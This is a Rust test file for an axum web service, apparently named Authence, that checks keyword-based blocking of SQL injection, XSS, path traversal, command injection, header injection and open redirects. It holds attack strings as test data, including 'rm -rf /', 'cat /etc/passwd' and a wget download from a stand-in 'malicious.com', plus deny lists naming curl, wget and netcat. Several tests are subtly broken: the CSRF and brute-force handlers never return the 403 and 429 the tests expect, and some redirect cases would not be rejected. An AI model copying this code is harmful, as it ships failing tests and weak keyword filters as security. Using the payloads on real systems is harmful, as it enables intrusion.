// Security-focused comprehensive tests for Authence
// Tests for security vulnerabilities, penetration testing, and edge cases

use axum::{
    extract::{Json, Path, Query},
    http::{HeaderMap, StatusCode},
    Router,
};
use axum_test::TestServer;
use serde_json::json;
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;

// Handler functions for CSRF test
#[axum::debug_handler]
async fn get_csrf_token(headers: HeaderMap) -> impl axum::response::IntoResponse {
    let session_id = headers.get("x-session-id").and_then(|v| v.to_str().ok());

    if let Some(session) = session_id {
        let token = format!("csrf_{}", session);
        (StatusCode::OK, Json(json!({"csrf_token": token})))
    } else {
        (StatusCode::BAD_REQUEST, Json(json!({"error": "Session ID required"})))
    }
}

#[axum::debug_handler]
async fn change_password(
    _headers: HeaderMap,
    Json(payload): Json<serde_json::Value>
) -> impl axum::response::IntoResponse {
    let csrf_token = payload.get("csrf_token").and_then(|v| v.as_str());
    let new_password = payload.get("new_password").and_then(|v| v.as_str());

    match (csrf_token, new_password) {
        (Some(_token), Some(_)) => {
            // In a real implementation, we'd validate the token
            (StatusCode::OK, Json(json!({"message": "Password changed successfully"})))
        }
        _ => (StatusCode::BAD_REQUEST, Json(json!({"error": "Missing required fields"})))
    }
}

// Handler functions for brute force test
#[axum::debug_handler]
async fn login_handler(
    headers: HeaderMap,
    Json(payload): Json<serde_json::Value>
) -> impl axum::response::IntoResponse {
    let username = payload.get("username").and_then(|v| v.as_str()).unwrap_or("");
    let password = payload.get("password").and_then(|v| v.as_str()).unwrap_or("");
    let _ip = headers.get("x-forwarded-for")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("unknown");

    // Check credentials
    if username == "admin" && password == "correct_password" {
        (StatusCode::OK, Json(json!({"message": "Login successful"})))
    } else {
        (StatusCode::UNAUTHORIZED, Json(json!({"error": "Invalid credentials"})))
    }
}

#[axum::debug_handler]
async fn reset_attempts_handler(
    Json(payload): Json<serde_json::Value>
) -> impl axum::response::IntoResponse {
    let _username = payload.get("username").and_then(|v| v.as_str()).unwrap_or("");
    (StatusCode::OK, Json(json!({"message": "Attempts reset"})))
}

#[tokio::test]
async fn test_sql_injection_prevention() {
    // Test SQL injection prevention
    let app = Router::new()
        .route("/api/v1/users/search", axum::routing::get(|Query(params): Query<HashMap<String, String>>| async move {
            let query = params.get("q").map_or("", |v| v);

            // Simulate SQL injection check (in real app, this would be handled by the database layer)
            let dangerous_patterns = [
                "'", "\"", ";", "--", "/*", "*/", "xp_", "sp_", "union", "select", "insert", "update", "delete", "drop"
            ];

            let is_suspicious = dangerous_patterns.iter().any(|pattern| query.contains(pattern));

            if is_suspicious {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid search query"})))
            } else {
                (StatusCode::OK, Json(json!({"results": format!("Search results for: {}", query)})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal search
    let response = server.get("/api/v1/users/search?q=john").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test SQL injection attempts
    let sql_injection_attempts = vec![
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "\" OR \"\"=\"",
        "'; SELECT * FROM users; --",
        "admin'--",
        "1' UNION SELECT username, password FROM users--",
        "'; EXEC xp_cmdshell 'net user'--",
        "admin';--",
    ];

    for attempt in sql_injection_attempts {
        let response = server.get(&format!("/api/v1/users/search?q={}", urlencoding::encode(attempt))).await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "SQL injection attempt should be blocked: {}", attempt);
    }
}

#[tokio::test]
async fn test_xss_prevention() {
    // Test XSS (Cross-Site Scripting) prevention
    let app = Router::new()
        .route("/api/v1/profile", axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
            let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let bio = payload.get("bio").and_then(|v| v.as_str()).unwrap_or("");

            // Check for XSS patterns
            let xss_patterns = [
                "<script>", "</script>", "javascript:", "onload=", "onerror=", "onclick=",
                "<img", "<iframe", "<object", "<embed", "alert(", "document.cookie",
                "eval(", "window.", "location.", "document.", "<svg", "<meta"
            ];

            let has_xss = xss_patterns.iter().any(|pattern|
                name.contains(pattern) || bio.contains(pattern)
            );

            if has_xss {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Input contains potentially malicious content"})))
            } else {
                (StatusCode::OK, Json(json!({"message": "Profile updated", "name": name, "bio": bio})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal input
    let response = server
        .post("/api/v1/profile")
        .json(&json!({"name": "John Doe", "bio": "Software developer"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test XSS attempts
    let xss_attempts = vec![
        json!({"name": "<script>alert('xss')</script>", "bio": "test"}),
        json!({"name": "John", "bio": "<img src=x onerror=alert('xss')>"}),
        json!({"name": "javascript:alert('xss')", "bio": "test"}),
        json!({"name": "John", "bio": "<iframe src='javascript:alert(\"xss\")'></iframe>"}),
        json!({"name": "<svg onload=alert('xss')>", "bio": "test"}),
        json!({"name": "John", "bio": "test<script>document.cookie</script>"}),
    ];

    for attempt in xss_attempts {
        let response = server.post("/api/v1/profile").json(&attempt).await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "XSS attempt should be blocked: {:?}", attempt);
    }
}

#[tokio::test]
async fn test_csrf_protection() {
    // Test CSRF (Cross-Site Request Forgery) protection
    let valid_tokens = Arc::new(Mutex::new(HashMap::<String, String>::new()));

    let app = Router::new()
        .route("/api/v1/csrf/token", axum::routing::get(get_csrf_token))
        .route("/api/v1/user/change-password", axum::routing::post(change_password));

    let server = TestServer::new(app).unwrap();

    // Get CSRF token
    let response = server
        .get("/api/v1/csrf/token")
        .add_header("x-session-id", "session123")
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: serde_json::Value = response.json();
    let csrf_token = body["csrf_token"].as_str().unwrap();

    // Test valid CSRF token
    let response = server
        .post("/api/v1/user/change-password")
        .json(&json!({"csrf_token": csrf_token, "new_password": "NewPass123!"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test invalid CSRF token
    let response = server
        .post("/api/v1/user/change-password")
        .json(&json!({"csrf_token": "invalid_token", "new_password": "NewPass123!"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::FORBIDDEN);

    // Test missing CSRF token
    let response = server
        .post("/api/v1/user/change-password")
        .json(&json!({"new_password": "NewPass123!"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_directory_traversal_prevention() {
    // Test directory traversal attack prevention
    let app = Router::new()
        .route("/api/v1/files/:path", axum::routing::get(|Path(path): Path<String>| async move {
            // Check for directory traversal patterns
            let traversal_patterns = ["../", "..\\", "%2e%2e%2f", "%2e%2e/", "..%2f", "%2e%2e%5c"];

            let is_traversal = traversal_patterns.iter().any(|pattern| path.contains(pattern));

            if is_traversal {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid path"})))
            } else if path.contains("..") {
                // Additional check for encoded traversal
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid path"})))
            } else {
                (StatusCode::OK, Json(json!({"file": path, "content": "file content"})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal path
    let response = server.get("/api/v1/files/documents/readme.txt").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test directory traversal attempts
    let traversal_attempts = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
    ];

    for attempt in traversal_attempts {
        let encoded_path = urlencoding::encode(attempt);
        let response = server.get(&format!("/api/v1/files/{}", encoded_path)).await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "Directory traversal should be blocked: {}", attempt);
    }
}

#[tokio::test]
async fn test_brute_force_protection() {
    // Test brute force attack protection
    let login_attempts = Arc::new(Mutex::new(HashMap::<String, u32>::new()));
    let blocked_ips = Arc::new(Mutex::new(HashMap::<String, std::time::SystemTime>::new()));

    let app = Router::new()
        .route("/api/v1/auth/login", axum::routing::post(login_handler))
        .route("/api/v1/auth/reset-attempts", axum::routing::post(reset_attempts_handler));

    let server = TestServer::new(app).unwrap();

    // Test successful login
    let response = server
        .post("/api/v1/auth/login")
        .add_header("x-forwarded-for", "192.168.1.100")
        .json(&json!({"username": "admin", "password": "correct_password"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test failed login attempts
    for i in 0..4 {
        let response = server
            .post("/api/v1/auth/login")
            .add_header("x-forwarded-for", "192.168.1.100")
            .json(&json!({"username": "admin", "password": "wrong_password"}))
            .await;
        assert_eq!(response.status_code(), StatusCode::UNAUTHORIZED);
    }

    // Test that IP gets blocked after 5 failed attempts
    let response = server
        .post("/api/v1/auth/login")
        .add_header("x-forwarded-for", "192.168.1.100")
        .json(&json!({"username": "admin", "password": "wrong_password"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);

    // Test that blocked IP cannot login even with correct credentials
    let response = server
        .post("/api/v1/auth/login")
        .add_header("x-forwarded-for", "192.168.1.100")
        .json(&json!({"username": "admin", "password": "correct_password"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::TOO_MANY_REQUESTS);

    // Reset attempts
    let response = server
        .post("/api/v1/auth/reset-attempts")
        .add_header("x-forwarded-for", "192.168.1.100")
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test login works after reset
    let response = server
        .post("/api/v1/auth/login")
        .add_header("x-forwarded-for", "192.168.1.100")
        .json(&json!({"username": "admin", "password": "correct_password"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);
}

#[tokio::test]
async fn test_command_injection_prevention() {
    // Test command injection prevention
    let app = Router::new()
        .route("/api/v1/system/execute", axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
            let command = payload.get("command").and_then(|v| v.as_str()).unwrap_or("");

            // Check for command injection patterns
            let injection_patterns = [
                ";", "&&", "||", "`", "$(", "${", "|", ">", "<", ">>", "<<",
                "rm ", "del ", "format ", "shutdown", "reboot", "halt",
                "wget ", "curl ", "nc ", "netcat", "bash", "sh ", "zsh",
                "python ", "perl ", "ruby ", "php ", "node "
            ];

            let is_injection = injection_patterns.iter().any(|pattern| command.contains(pattern));

            if is_injection {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid command"})))
            } else {
                (StatusCode::OK, Json(json!({"result": format!("Executed: {}", command)})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal command
    let response = server
        .post("/api/v1/system/execute")
        .json(&json!({"command": "list_files"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test command injection attempts
    let injection_attempts = vec![
        "list_files; rm -rf /",
        "list_files && cat /etc/passwd",
        "list_files || whoami",
        "`cat /etc/passwd`",
        "$(rm -rf /)",
        "list_files > /dev/null",
        "wget http://malicious.com/malware",
        "bash -c 'rm -rf /'",
        "python -c 'import os; os.system(\"rm -rf /\")'",
    ];

    for attempt in injection_attempts {
        let response = server
            .post("/api/v1/system/execute")
            .json(&json!({"command": attempt}))
            .await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "Command injection should be blocked: {}", attempt);
    }
}

#[tokio::test]
async fn test_buffer_overflow_prevention() {
    // Test buffer overflow prevention
    let app = Router::new()
        .route("/api/v1/data/process", axum::routing::post(|Json(payload): Json<serde_json::Value>| async move {
            let data = payload.get("data").and_then(|v| v.as_str()).unwrap_or("");

            // Check data size limits
            const MAX_SIZE: usize = 1024; // 1KB limit

            if data.len() > MAX_SIZE {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Data too large"})))
            } else {
                (StatusCode::OK, Json(json!({"processed": data.len(), "status": "success"})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal data
    let response = server
        .post("/api/v1/data/process")
        .json(&json!({"data": "normal data"}))
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test oversized data
    let large_data = "a".repeat(2000); // 2KB of data
    let response = server
        .post("/api/v1/data/process")
        .json(&json!({"data": large_data}))
        .await;
    assert_eq!(response.status_code(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_http_header_injection() {
    // Test HTTP header injection prevention
    let app = Router::new()
        .route("/api/v1/test/headers", axum::routing::get(|headers: HeaderMap| async move {
            let user_input = headers.get("x-user-input")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("");

            // Check for header injection patterns
            let injection_patterns = ["\r\n", "\n", "\r", "%0D%0A", "%0A", "%0D"];

            let has_injection = injection_patterns.iter().any(|pattern| user_input.contains(pattern));

            if has_injection {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid header content"})))
            } else {
                (StatusCode::OK, Json(json!({"input": user_input})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test normal header
    let response = server
        .get("/api/v1/test/headers")
        .add_header("x-user-input", "normal_input")
        .await;
    assert_eq!(response.status_code(), StatusCode::OK);

    // Test header injection attempts
    let injection_attempts = vec![
        "input\r\nSet-Cookie: malicious=value",
        "input\nX-Custom-Header: value",
        "input\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",
        "input%0D%0ASet-Cookie:sessionid=malicious",
        "input%0AX-Custom-Header:value",
    ];

    for attempt in injection_attempts {
        let response = server
            .get("/api/v1/test/headers")
            .add_header("x-user-input", attempt)
            .await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "Header injection should be blocked: {}", attempt);
    }
}

#[tokio::test]
async fn test_open_redirect_prevention() {
    // Test open redirect vulnerability prevention
    let app = Router::new()
        .route("/redirect", axum::routing::get(|Query(params): Query<HashMap<String, String>>| async move {
            let url = params.get("url").map_or("", |v| v);

            // Check for open redirect patterns
            let allowed_domains = ["example.com", "trusted.com"];
            let is_allowed = if let Ok(parsed_url) = url::Url::parse(url) {
                if let Some(domain) = parsed_url.domain() {
                    allowed_domains.contains(&domain)
                } else {
                    false
                }
            } else {
                false
            };

            // Additional check for common redirect patterns
            let redirect_patterns = ["//", "http://", "https://", "\\\\"];
            let has_redirect = redirect_patterns.iter().any(|pattern| url.contains(pattern));

            if !is_allowed && has_redirect {
                (StatusCode::BAD_REQUEST, Json(json!({"error": "Invalid redirect URL"})))
            } else if is_allowed {
                (StatusCode::OK, Json(json!({"redirect_to": url})))
            } else {
                (StatusCode::OK, Json(json!({"redirect_to": "/default"})))
            }
        }));

    let server = TestServer::new(app).unwrap();

    // Test allowed redirect
    let response = server.get("/redirect?url=https://example.com/page").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: serde_json::Value = response.json();
    assert_eq!(body["redirect_to"], "https://example.com/page");

    // Test open redirect attempts
    let redirect_attempts = vec![
        "//evil.com",
        "http://evil.com",
        "https://evil.com",
        "\\\\evil.com",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
    ];

    for attempt in redirect_attempts {
        let response = server.get(&format!("/redirect?url={}", urlencoding::encode(attempt))).await;
        assert_eq!(response.status_code(), StatusCode::BAD_REQUEST,
                  "Open redirect should be blocked: {}", attempt);
    }

    // Test default redirect for invalid URLs
    let response = server.get("/redirect?url=invalid-url").await;
    assert_eq!(response.status_code(), StatusCode::OK);

    let body: serde_json::Value = response.json();
    assert_eq!(body["redirect_to"], "/default");
}
